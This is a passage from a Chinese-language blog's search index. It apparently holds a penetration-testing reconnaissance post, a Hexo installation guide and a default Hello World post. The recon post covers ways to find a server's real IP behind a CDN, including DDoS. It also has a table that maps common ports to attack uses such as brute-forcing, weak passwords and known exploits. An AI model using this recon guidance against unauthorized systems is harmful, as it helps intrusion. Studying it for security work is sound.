title="七、真实ip"></a>七、真实ip</h2><h3 id="是否有CDN"><a href="#是否有CDN" class="headerlink" title="是否有CDN"></a>是否有CDN</h3></li></ul><p>1.确定有无cdn<br>使用全国ping 看看ip是否都是一样的 如果是不一样的就可能是使用了CDN的<br>2.使用 nslookup 进行检测，如果返回域名解析对应多个 IP 地址多半是使用了 CDN<br>3.通过谷歌插件(wapplayzer)查看判断是否有CDN</p><h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><ul><li>同国家IP地址访问查询<br>  子域名查询<br>  邮箱查询<br>  敏感文件(探针或phpinfo.php)<br>  扫描全网<br>  DNS历史记录<br>  黑暗引擎<br>  DDOS</li></ul><p>1.通过子域名判断真实ip 因为子域名一般都是没有CDN的 CDN一般都是流量大的站才有<br>2.用国外地址请求  因为CDN一般都是针对国内的用户 如果是国外的话有可能是没有CDN 的 如果是国内的目标的话<br>3.通过敏感文件查看真实的ip 如phpinfo<br>4.查看DNS记录<br>可能有目标没有挂CDN时的DNS记录<br>5.黑暗引擎</p><ul><li>zoomeye、fofa、shodan<br>  通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：<br>  特有的http头部（如server类型、版本、cookie等信息)、<br>  特定keyword（如title、css、js、url等）、<br>  特定的IP段搜索（如fofa支持C段搜索），<br>  有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。<h2 id="八、端口信息收集"><a href="#八、端口信息收集" class="headerlink" title="八、端口信息收集"></a>八、端口信息收集</h2>通过nmap：<h3 id="Nmap常用扫描参数说明"><a href="#Nmap常用扫描参数说明" class="headerlink" title="Nmap常用扫描参数说明"></a>Nmap常用扫描参数说明</h3><img src="https://img-blog.csdnimg.cn/20210517203036646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDQ4MzU5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="常见的端口信息及渗透方法："><a href="#常见的端口信息及渗透方法：" class="headerlink" title="常见的端口信息及渗透方法："></a>常见的端口信息及渗透方法：</h3><p><strong>端口号</strong>      <strong>端口服务/协议简要说明</strong>       <strong>关于端口可能的一些渗透用途</strong><br>tcp 21    ftp 默认的数据和命令传输端口[可明文亦可加密传输]  允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)<br>tcp 22    ssh[数据ssl加密传输]    可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…<br>tcp 23    telnet[明文传输]    爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获<br>tcp 25    smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]    邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑<br>tcp/udp 53    dns[域名解析]    允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控<br>tcp/udp 69    tftp[简单文件传输协议,无认证]    尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089    web[各种常用的web服务端口]    各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……<br>tcp 110    [邮局协议,可明文可密文]    可尝试爆破,嗅探 tcp 137,139,445    samba[smb实现windows和linux间文件共享,明文]    可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……<br>tcp 143    imap[可明文可密文]    可尝试爆破 udp 161    snmp[明文]    爆破默认团队字符串,搜集目标内网信息<br>tcp 389    ldap[轻量级目录访问协议]    ldap注入,允许匿名访问,弱口令 tcp 512,513,514    linux rexec    可爆破,rlogin登陆<br>tcp 873    rsync备份服务    匿名访问,文件上传 tcp 1194    openvpn    想办法钓vpn账号,进内网<br>tcp 1352    Lotus domino邮件服务    弱口令,信息泄漏,爆破<br>tcp 1433    mssql数据库    注入,提权,sa弱口令,<br>爆破 tcp 1521    oracle数据库    tns爆破,注入,弹shell…<br>tcp 1500    ispmanager 主机控制面板    弱口令<br>tcp 1025,111,2049    nfs    权限配置不当<br>tcp 1723    pptp    爆破,想办法钓vpn账号,进内网<br>tcp 2082,2083    cpanel主机管理面板登录    弱口令<br>tcp 2181    zookeeper    未授权访问<br>tcp 2601,2604    zebra路由    默认密码zerbra<br>tcp 3128    squid代理服务    弱口令<br>tcp 3312,3311    kangle主机管理登录    弱口令<br>tcp 3306    mysql数据库    注入,提权,爆破<br>tcp 3389    windows rdp远程桌面    shift后门,爆破,ms12-020[蓝屏exp]<br>tcp 4848    glassfish控制台    弱口令<br>tcp 4899    radmin远程桌面管理工具, 抓密码拓展机器<br>tcp 5000    sybase/DB2数据库    爆破,注入<br>tcp 5432    postgresql数据库    爆破,注入,弱口令<br>tcp 5632    pcanywhere远程桌面管理工具    抓密码,代码执行<br>tcp 5900,5901,5902    vnc远程桌面管理工具    弱口令爆破,如果信息搜集不到位,成功几率很小<br>tcp 5984    CouchDB    未授权导致的任意指令执行<br>tcp 6379    redis未授权    可尝试未授权访问,弱口令爆破<br>tcp 7001,7002    weblogic控制台    java反序列化,弱口令<br>tcp 7778    kloxo    主机面板登录<br>tcp 8000    Ajenti主机控制面板    弱口令<br>tcp 8443    plesk主机控制面板    弱口令<br>tcp 8069    zabbix    远程执行,sql注入<br>tcp 8080-8089    Jenkins,jboss    反序列化,控制台弱口令<br>tcp 9080-9081,9090    websphere控制台    java反序列化/弱口令<br>tcp 9200,9300    elasticsearch    远程执行<br>tcp 10000    webmin linux主机web控制面板入口    弱口令<br>tcp 11211    memcached    未授权访问<br>tcp 27017,27018    mongodb    爆破,未授权访问<br>tcp 3690    svn服务    svn泄露,未授权访问<br>tcp 50000    SAP Management Console    远程执行<br>tcp 50070,50030    hadoop    默认端口未授权访问</p><h3 id="Nmap脚本分类"><a href="#Nmap脚本分类" class="headerlink" title="Nmap脚本分类"></a>Nmap脚本分类</h3><p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br><strong>常用的有 auth   brute   vuln</strong></p>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="https://nodejs.org/en/">Node.js</a>(Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a><br>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 <a href="#anzhuang">安装 Hexo</a> 步骤。<br>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。<h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2></li><li>Windows：下载并安装 git.</li><li>Mac：使用 Homebrew, MacPorts 或者下载 安装程序。</li><li>Linux (Ubuntu, Debian)：sudo apt-get install git-core</li><li>Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core</li></ul><blockquote><h2 id="Mac-用户"><a href="#Mac-用户" class="headerlink" title="Mac 用户"></a>Mac 用户</h2><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入<br>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。</p><h2 id="Windows-用户"><a href="#Windows-用户" class="headerlink" title="Windows 用户"></a>Windows 用户</h2><p> 对于中国大陆地区用户，可以前往 淘宝 Git for Windows 镜像 下载 git 安装包。<br>安装 Node.js<br>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。</p></blockquote><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>Node.js 为大多数平台提供了官方的 安装程序。对于中国大陆地区用户，可以前往 淘宝 Node.js 镜像 下载。<br>其它的安装方法：</p><ul><li>Windows：通过 nvs（推荐）或者nvm 安装。</li><li>Mac：使用 Homebrew 或 MacPorts 安装。</li><li>Linux（DEB/RPM-based）：从 NodeSource 安装。<br>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 指导<br>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a><span id="anzhuang">安装 Hexo</span></h2>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。<blockquote><p>$ npm install -g hexo-cli</p></blockquote><h2 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h2>对于熟悉 npm 的进阶用户，可以仅局部安装 hexo 包。<blockquote><p>$ npm install hexo</p></blockquote></li></ul><p>安装以后，可以使用以下两种方式执行 Hexo：<br>1.npx hexo <command><br>2.将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p><blockquote><p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p></blockquote><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><blockquote><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install</folder></folder></p></blockquote><p>新建完成后，指定文件夹的目录如下：</p><blockquote><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes</p></blockquote><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><blockquote><p>package.json<br>{<br>  “name”: “hexo-site”,<br>  “version”: “0.0.0”,<br>  “private”: true,<br>  “hexo”: {<br>    “version”: “”<br>  },<br>  “dependencies”: {<br>    “hexo”: “^3.8.0”,<br>    “hexo-generator-archive”: “^0.1.5”,<br>    “hexo-generator-category”: “^0.1.3”,<br>    “hexo-generator-index”: “^0.2.1”,<br>    “hexo-generator-tag”: “^0.2.0”,<br>    “hexo-renderer-ejs”: “^0.3.1”,<br>    “hexo-renderer-stylus”: “^0.3.3”,<br>    “hexo-renderer-marked”: “^0.3.2”,<br>    “hexo-server”: “^0.3.3”<br>  }<br>}</p></blockquote><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p>模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。<br>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>主题 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote><p>$ hexo init [folder]</p></blockquote><p>新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。</p><p>本命令相当于执行了以下几步：</p><ul><li>Git clone hexo-starter 和 hexo-theme-landscape 主题到当前目录或指定目录。</li><li>使用 Yarn 1、pnpm 或 npm 包管理器下载依赖（如有已安装多个，则列在前面的优先）。npm 默认随 Node.js 安装。<h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><blockquote><p>$ hexo generate</p></blockquote>生成静态文件。</li></ul><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr><tr><td>-b, –bail</td><td>生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td>-f, –force</td><td>强制重新生成文件Hexo 引入了差分机制，如果 public 目录存在，那么 hexo 只会重新生成改动的文件。使用该参数的效果接近 hexo clean &amp;&amp; hexo generate</td></tr><tr><td>-c, –concurrency</td><td>最大同时生成文件的数量，默认无限制</td></tr></tbody></table><p>该命令可以简写为</p><blockquote><p>$ hexo g</p></blockquote><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><blockquote><p>$ hexo publish [layout] &lt; filename &gt;</p></blockquote><p>发表草稿。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><blockquote><p>$ hexo server</p></blockquote><p>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/%E3%80%82">http://localhost:4000/。</a></p><blockquote><p>-p, –port    重设端口<br>-s, –static    只使用静态文件<br>-l, –log    启动日记记录，使用覆盖记录格式</p></blockquote><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><blockquote><p>$ hexo deploy</p></blockquote><p>部署网站。</p><blockquote><p>-g, –generate    部署之前预先生成静态文件</p></blockquote><p>该命令可以简写为：</p><blockquote><p>$ hexo d</p></blockquote><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><blockquote><p>$ hexo render &lt; file1&gt; [file2] …</p></blockquote><p>渲染文件。</p><blockquote><p>-o, –output    设置输出路径</p></blockquote><h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><blockquote><p>$ hexo migrate &lt; type&gt;</p></blockquote><p>从其他博客系统 迁移内容。</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><blockquote><p>$ hexo clean</p></blockquote><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><blockquote><p>$ hexo list &lt; type&gt;</p></blockquote><p>列出网站资料。</p><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><blockquote><p>$ hexo version</p></blockquote><p>显示 Hexo 版本。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/05/16/hello-world/"/>
    <url>/2021/05/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
